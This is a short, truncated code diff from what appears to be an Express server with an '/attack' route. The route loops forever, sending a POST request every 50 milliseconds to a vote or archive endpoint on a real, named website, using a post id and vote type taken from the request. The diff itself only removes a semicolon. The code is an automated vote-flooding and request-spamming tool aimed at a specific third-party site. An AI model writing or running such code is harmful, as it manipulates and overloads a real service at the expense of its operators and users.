@@ -18,7 +18,7 @@ app.post('/attack', async (req, res) => {
   const id = req.body.id;
   const voteType = req.body.voteType;
   let count = 0;
-  res.status(200).json({"status": "started"});
+  res.status(200).json({"status": "started"})
   while ( true ) {
     await sleep(50);
     fetch(`https://healthy-person-emulator.org/archives/${id}?_data=routes%2F_layout.archives.%24postId`, {method: "POST", headers: {
